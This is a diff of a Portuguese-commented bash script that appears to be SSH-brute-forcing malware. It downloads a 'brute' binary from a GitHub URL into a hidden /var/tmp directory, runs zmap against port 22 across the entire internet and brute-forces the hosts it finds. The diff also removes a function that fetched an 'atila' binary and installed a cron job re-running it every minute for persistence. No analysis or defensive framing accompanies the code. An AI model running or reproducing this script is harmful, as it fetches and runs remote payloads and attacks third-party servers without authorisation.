@@ -1,53 +1,34 @@
 #ATILA_VKZMN
 
-#esse script executara varias acoes   elas serao inplemetadas  
 
-#nem todas agora ok so as mais importantes por agora ok
-
-url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'
 brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'
 url_zmap='https://github.com/zmap/zmap/archive/refs/tags/v4.4.0.zip'
 
-wget_ok=0
-
-
-
-
-
 brute(){
-
 
 cd /var/tmp  ; cd .brute
 
 wget $brute_url  -O brute || curl  -L $brute_url -o brute
 
-
 chmod 777 brute && chmod 777 zmap
-
 
 timeout   120s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
 
-
 timeout   120s    ./brute  #120 segundos para  testa o   ip
-
 
 return
 
 }
 
 
-
-
 #################################
 install_zmap(){
-
 
 #function no critical
 
 cd /var/tmp 
 
 out_cat=$(cat .brute/zmap )  #troca  cat por ls
-
 
 if (( ! $?  )) ; then 
 
@@ -59,8 +40,7 @@ return
 
 fi ; 
 
-
-
+#####################################
 
 if [ $EUID -eq  0 ] ; then
 
@@ -101,35 +81,6 @@ fi; #nao so root
 
 
 
-cron() {
-
-cron_out=$( crontab -l )
-if  echo  "$cron_out" | grep -q atila  ; then 
-echo tem
-else
-echo nao tem
-#download of atila and add in crontab 
-command -v wget
-if (( $? )) ; then
-wget_ok=0
-else
-wget_ok=1
-fi;
-if [ $wget_ok -eq 1 ] ; then
-wget $url -O /var/tmp/atila
-cd /var/tmp ; chmod 777 atila
-(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
-else
-curl  -L  $url -o /var/tmp/atila
-cd /var/tmp ; chmod 777 atila
-(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
-
-fi;
-fi;
-}
-##################
-
-
 
 
 ##################
@@ -138,16 +89,12 @@ init() {
 
  
 while true ; do
-install_zmap
 
-sleep   5
+install_zmap
+ 
+sleep   1
 
 done
-
-
-
-cron  &
-
 
 
 }
